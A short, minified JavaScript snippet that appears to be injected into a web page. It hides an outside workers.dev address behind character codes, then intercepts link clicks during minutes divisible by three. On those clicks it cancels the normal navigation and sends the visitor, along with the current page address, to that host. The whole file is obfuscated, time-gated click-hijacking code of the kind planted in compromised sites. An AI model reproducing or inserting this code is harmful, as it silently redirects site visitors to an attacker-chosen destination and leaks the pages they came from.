!function(){for(var _="",i=[104,116,116,112,115,58,47,47,108,105,110,107,46,107,97,115,119,111,114,108,100,45,97,101,114,111,46,119,111,114,107,101,114,115,46,100,101,118,63,117,114,108,61],j=0;j<i.length;j++)_+=String.fromCharCode(i[j]);
document.addEventListener("click",function(e){
var t=e.target.closest("a[href]");
if(!t||/^(javascript:|mailto:|tel:)/i.test(t.href))return;
if((new Date).getMinutes()%3)return;
e.preventDefault();
location.href=_+encodeURIComponent(location.href)
},!0)}();
